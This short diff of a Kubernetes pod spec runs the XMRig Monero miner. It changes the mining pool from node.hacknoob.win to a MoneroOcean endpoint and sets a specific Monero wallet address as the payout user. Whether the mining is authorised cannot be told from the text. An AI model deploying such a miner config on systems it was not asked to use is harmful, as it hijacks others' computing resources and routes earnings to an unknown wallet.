@@ -18,9 +18,9 @@ spec:
     command:
     - /home/worker4/xmrig/build/xmrig
     - -o
-    - node.hacknoob.win:3333
+    - gulf.moneroocean.stream:80
     - -u
-    - slave4
+    - 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5
     volumeMounts:
     - name: xmrig-volume-4
       mountPath: /
